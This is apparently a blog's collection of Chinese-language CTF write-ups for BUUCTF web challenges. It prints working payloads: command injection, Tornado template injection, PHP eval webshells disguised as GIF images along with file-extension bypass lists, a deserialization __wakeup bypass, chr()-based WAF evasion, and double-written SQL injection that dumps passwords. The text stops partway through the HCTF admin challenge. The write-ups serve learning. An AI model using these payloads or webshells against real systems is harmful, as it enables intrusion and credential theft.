+<p><img src="https://img-blog.csdnimg.cn/20210117113243979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat /f*;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Orz.txt 进去提示是 render()</span><br><span class="line">hint.txt 进去提示是 md5(cookie_secret + md5(filename))</span><br><span class="line">flag.txt 进去提示是 /fllllllllllag</span><br></pre></td></tr></table></figure>
+
+<p>注意查看 url的格式</p>
+<p><code>http://f3935217-6a95-491e-835b-2d172cfd9138.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=980fa5e6f1ece480d174ae0354c9655b</code></p>
+<p>查了一下 tornado这个框架</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Tornado是一种 Web 服务器软件的开源版本。Tornado 和主流Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。</span><br><span class="line">得利于其非阻塞的方式和对epoll的运用，Tornado 每秒可以处理数以千计的连接，因此 Tornado 是实时 Web 服务的一个 理想框架。</span><br></pre></td></tr></table></figure>
+
+<p>输入了不存在的地址 发现有报错</p>
+<p>感觉是报错模板注入了</p>
+<p>不知道要怎么读到  cookie_secret 这个变量</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/83999.html">服务端模板注入攻击 （SSTI）之浅析</a></p>
+<p><code>/error?msg=&#123;&#123;1&#125;&#125;</code> 确实可以执行，确定是SSTI，这个 <code>( ) [ ] _</code> 全给过滤了，看来只能想别的办法了。。</p>
+<p>通过膜拜大佬博客发现cookie_secret在Application对象settings属性中，还发现self.application.settings有一个<a target="_blank" rel="noopener" href="https://tornado.readthedocs.io/en/latest/web.html#tornado.web.RequestHandler.settings">别名</a></p>
+<p>handler指向的处理当前这个页面的RequestHandler对象，<br>RequestHandler.settings指向self.application.settings，<br>因此handler.settings指向RequestHandler.application.settings。</p>
+<p>构造payload获取cookie_secret</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后根据<code>md5(cookie_secret+md5(filename))</code>，得到/fllllllllllllag访问的哈希，最后拿到flag</p>
+<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>打开题目 发现页面给了一句话</p>
+<p><img src="https://img-blog.csdnimg.cn/20210117231903596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Syc=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>打开题目 查看源代码</p>
+<p>发现有calc.php 打开发现waf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str = $_GET[&#x27;num&#x27;];</span><br><span class="line">        $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;,&#x27;\$&#x27;,&#x27;\\&#x27;,&#x27;\^&#x27;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>先列出根目录文件 发现flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">? num=print_r(scandir(&#x27;/&#x27;)); 这里由于单引号被过滤了，那就用chr()绕过，chr(47)就是斜杠/  </span><br><span class="line">? num=print_r(scandir(chr(47)));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210117235033293.png" alt="在这里插入图片描述"></p>
+<p>读取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">? num=print_r(file_get_contents(&#x27;/flagg&#x27;));</span><br><span class="line">这里/=chr(47),f=chr(102),l=chr(49),a=chr(97),g=chr(103),g=chr(103)来进行绕过</span><br><span class="line">? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));</span><br></pre></td></tr></table></figure>
+
+<h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
+<p>PHP的字符串解析特性:</p>
+<p> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.删除空白符</span><br><span class="line">2.将某些字符转换为下划线（包括空格）</span><br></pre></td></tr></table></figure>
+
+<p>【当waf不让你过的时候，php却可以让你过】</p>
+<p><strong>还有一种方法 HTTP请求走私 我太菜了 还没学会 后面再补吧</strong></p>
+<p>可参考:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/chrysanthemum/p/11757363.html">https://www.cnblogs.com/chrysanthemum/p/11757363.html</a></p>
+<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>这题早有耳闻  入门的时候做过 考点肯定就是利用bp改包伪造请求</p>
+<p>右键源代码 发现提示</p>
+<p><img src="https://img-blog.csdnimg.cn/20210118000755505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>打开提示</p>
+<p><img src="https://img-blog.csdnimg.cn/2021011800082519.png" alt="在这里插入图片描述"></p>
+<p>说明要改 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: https://www.Sycsecret.com</span><br></pre></td></tr></table></figure>
+
+<p>又提示</p>
+<p>再改</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &quot;Syclover&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210118001403888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>再改</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>得到flag </p>
+<p>放一张最终的图</p>
+<p><img src="https://img-blog.csdnimg.cn/20210118001454919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>打开题目开到这个  忍不住扫呀</p>
+<p><img src="https://img-blog.csdnimg.cn/20210118001741107.png" alt="在这里插入图片描述"></p>
+<p>试了 <a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 还真对了。。。 不愧是我。。。(忍不住吐槽，这题目真TM的卡)</p>
+<p>打开class.php一看源码 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username = &#x27;guest&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password != 100) &#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username === &#x27;admin&#x27;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;</span><br><span class="line">            die();      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>反序列没错了  再看看index.php 发现这一段</p>
+<pre><code>&lt;?php
+include &#39;class.php&#39;;
+$select = $_GET[&#39;select&#39;];
+$res=unserialize(@$select);
+?&gt;
+</code></pre>
+<p>可以看到我们关键的点是绕过 _wakeup方法 </p>
+<p>当序列化字符串中，表示对象属性个数的值大于实际属性个数时，那么就会跳过wakeup方法的执行</p>
+<p>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Name</span><br><span class="line">&#123;</span><br><span class="line">    private $username = &#x27;admin&#x27;;</span><br><span class="line">    private $password = &#x27;100&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Name();</span><br><span class="line">#进行url编码，防止%00对应的不可打印字符在复制时丢失</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span><br></pre></td></tr></table></figure>
+
+<p>将上面得到的payoad 的对象个数改成3就行了</p>
+<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>考点很明显了 文件上传</p>
+<p>随便传个一句话图片试试</p>
+<p>提示不能有  <code>&lt;?</code></p>
+<p>再穿个 phpinfo();进去 提示</p>
+<p><strong>Don’t lie to me, it’s not image at all!!!</strong></p>
+<p>估计是判断文件头了  </p>
+<p>上一张图片马试试 也不行 那就用这个  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;flag&#x27;]);&lt;/script&gt; </span><br></pre></td></tr></table></figure>
+
+<p>bp抓包 改一下content-type 发现php5不行</p>
+<p>用phtml 成功上传</p>
+<p><img src="https://img-blog.csdnimg.cn/20210118130053276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>上蚁剑就行了</p>
+<p><img src="https://img-blog.csdnimg.cn/20210118130616955.png" alt="在这里插入图片描述"></p>
+<p>拓展:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1：碰到过一次任意文件上穿漏洞，在config.php中并未发现定义类型Media，请求：upload/.php?Type=Media</span><br><span class="line">2:上传图片马</span><br><span class="line">3:序列化木马：</span><br><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">	var $a = &quot;&lt;?php phpinfo()?&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$aa = new A();</span><br><span class="line">echo serialize($aa);</span><br><span class="line">?&gt;</span><br><span class="line">4:php,php3,php4,php5,phtml.pht</span><br><span class="line">5:扩展名绕过</span><br><span class="line">Asp:asa cer cdx</span><br><span class="line">Aspx:ashx asmx ascx</span><br><span class="line">Php:php3 phptml</span><br><span class="line">Jsp:jspx jspf</span><br><span class="line">6:</span><br><span class="line">&lt;script language=php&gt;system(&quot;ls&quot;)&lt;/script&gt;</span><br><span class="line">7:</span><br><span class="line">GIF89a?</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12243206.html">https://www.cnblogs.com/wangtanzhi/p/12243206.html</a></p>
+<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>试了试万能密码 提示</p>
+<p><img src="https://img-blog.csdnimg.cn/20210118133537924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>明显是 or被过滤了。。  双写试一下 过了 这题应该就是考双写绕过了</p>
+<p>搬出 lovesql的 payload  太坏了太坏了 表名都改了</p>
+<p><img src="https://img-blog.csdnimg.cn/20210118133746241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>用自己payload 打不通  我大意了！没闪  IMformation 的or也要双写  又忘了淦！</p>
+<p>查表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=d&amp;password=1&#x27; uniunionon selselectect 1,2,group_concat(table_name) frofromm infoorrmation_schema.tables whewherere table_schema=database()%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210118134207684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>查列名  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=d&amp;password=1&#x27; ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns wwherehere table_schema=database() aandnd table_name=`b4bsql`%23</span><br></pre></td></tr></table></figure>
+
+<p>有个password 直接打进去看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&amp;password=1&#x27; uniunionon selselectect 2,2,group_concat(passwoorrd) ffromrom `b4bsql`%23</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>我本来把突破口放在edit页面 看看有没有sql注入或者文件写入之类的</p>
+<p>膜拜膜拜师傅们的wp，原来我连思路都错了，对不起 是我太菜了</p>
+<p>web开发的路由:</p>
+<p>“route”是指根据url分配到对应的处理程序。</p>
+<h3 id="解法一-flask-session-伪造"><a href="#解法一-flask-session-伪造" class="headerlink" title="解法一:flask session 伪造"></a>解法一:flask session 伪造</h3><p>登录后查看源码有提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>是 flask 写的，查看 hctf_flask/app/routes.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"> </span><br><span class="line">from flask import Flask, render_template, url_for, flash, request, redirect, session, make_response</span><br><span class="line">from flask_login import logout_user, LoginManager, current_user, login_user</span><br><span class="line">from app import app, db</span><br><span class="line">from config import Config</span><br><span class="line">from app.models import User</span><br><span class="line">from forms import RegisterForm, LoginForm, NewpasswordForm</span><br><span class="line">from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep</span><br><span class="line">from io import BytesIO</span><br><span class="line">from code import get_verify_code</span><br><span class="line"> </span><br><span class="line">@app.route(&#x27;/code&#x27;)</span><br><span class="line">def get_code():</span><br><span class="line">    image, code = get_verify_code()</span><br><span class="line">    # 图片以二进制形式写入</span><br><span class="line">    buf = BytesIO()</span><br><span class="line">    image.save(buf, &#x27;jpeg&#x27;)</span><br><span class="line">    buf_str = buf.getvalue()</span><br><span class="line">    # 把buf_str作为response返回前端，并设置首部字段</span><br><span class="line">    response = make_response(buf_str)</span><br><span class="line">    response.headers[&#x27;Content-Type&#x27;] = &#x27;image/gif&#x27;</span><br><span class="line">    # 将验证码字符串储存在session中</span><br><span class="line">    session[&#x27;image&#x27;] = code</span><br><span class="line">    return response</span><br><span class="line"> </span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">@app.route(&#x27;/index&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;index.html&#x27;, title = &#x27;hctf&#x27;)</span><br><span class="line"> </span><br><span class="line">@app.route(&#x27;/register&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def register():</span><br><span class="line"> </span><br><span class="line">    if current_user.is_authenticated:</span><br><span class="line">        return redirect(url_for(&#x27;index&#x27;))</span><br><span class="line"> </span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        if session.get(&#x27;image&#x27;).lower() != form.verify_code.data.lower():</span><br><span class="line">            flash(&#x27;Wrong verify code.&#x27;)</span><br><span class="line">            return render_template(&#x27;register.html&#x27;, title = &#x27;register&#x27;, form=form)</span><br><span class="line">        if User.query.filter_by(username = name).first():</span><br><span class="line">            flash(&#x27;The username has been registered&#x27;)</span><br><span class="line">            return redirect(url_for(&#x27;register&#x27;))</span><br><span class="line">        user = User(username=name)</span><br><span class="line">        user.set_password(form.password.data)</span><br><span class="line">        db.session.add(user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(&#x27;register successful&#x27;)</span><br><span class="line">        return redirect(url_for(&#x27;login&#x27;))</span><br><span class="line">    return render_template(&#x27;register.html&#x27;, title = &#x27;register&#x27;, form = form)</span><br><span class="line"> </span><br><span class="line">@app.route(&#x27;/login&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def login():</span><br><span class="line">    if current_user.is_authenticated:</span><br><span class="line">        return redirect(url_for(&#x27;index&#x27;))</span><br><span class="line"> </span><br><span class="line">    form = LoginForm()</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        session[&#x27;name&#x27;] = name</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        if user is None or not user.check_password(form.password.data):</span><br><span class="line">            flash(&#x27;Invalid username or password&#x27;)</span><br><span class="line">            return redirect(url_for(&#x27;login&#x27;))</span><br><span class="line">        login_user(user, remember=form.remember_me.data)</span><br><span class="line">        return redirect(url_for(&#x27;index&#x27;))</span><br><span class="line">    return render_template(&#x27;login.html&#x27;, title = &#x27;login&#x27;, form = form)</span><br><span class="line"> </span><br><span class="line">@app.route(&#x27;/logout&#x27;)</span><br><span class="line">def logout():</span><br><span class="line">    logout_user()</span><br><span class="line">    return redirect(&#x27;/index&#x27;)</span><br><span class="line"> </span><br><span class="line">@app.route(&#x27;/change&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def change():</span><br><span class="line">    if not current_user.is_authenticated:</span><br><span class="line">        return redirect(url_for(&#x27;login&#x27;))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        name = strlower(session[&#x27;name&#x27;])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(&#x27;change successful&#x27;)</span><br><span class="line">        return redirect(url_for(&#x27;index&#x27;))</span><br><span class="line">    return render_template(&#x27;change.html&#x27;, title = &#x27;change&#x27;, form = form)</span><br><span class="line"> </span><br><span class="line">@app.route(&#x27;/edit&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def edit():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        </span><br><span class="line">        flash(&#x27;post successful&#x27;)</span><br><span class="line">        return redirect(url_for(&#x27;index&#x27;))</span><br><span class="line">    return render_template(&#x27;edit.html&#x27;, title = &#x27;edit&#x27;)</span><br><span class="line"> </span><br><span class="line">@app.errorhandler(404)</span><br><span class="line">def page_not_found(error):</span><br><span class="line">    title = unicode(error)</span><br><span class="line">    message = error.description</span><br><span class="line">    return render_template(&#x27;errors.html&#x27;, title=title, message=message)</span><br><span class="line"> </span><br><span class="line">def strlower(username):</span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    return username</span><br></pre></td></tr></table></figure>
+
+<p>index</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/index&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;index.html&#x27;, title = &#x27;hctf&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>render_template 的功能是对先引入 index.html ，同时根据后面传入的参数，对 html 进行修改渲染,这里没有进行改动</p>
+<p>查看 hctf_flask/app/templates/index.html</p>
